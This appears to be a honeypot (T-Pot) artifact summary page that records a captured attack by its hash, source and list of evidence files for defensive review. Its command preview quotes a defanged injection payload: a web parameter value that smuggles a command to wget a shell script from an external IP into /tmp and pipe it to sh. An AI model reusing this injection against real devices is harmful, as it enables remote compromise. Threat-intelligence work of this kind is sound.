# 28c7dd2a184df4ca704e900d3c4e39445a8c0eebaed524e4bd1ee6c754919ae1

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `28c7dd2a184df4ca704e900d3c4e39445a8c0eebaed524e4bd1ee6c754919ae1` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
action=white_led&brightness=$(cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s avtech2;busybox wget hxxp://91[.]92[.]40[.]XXX
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
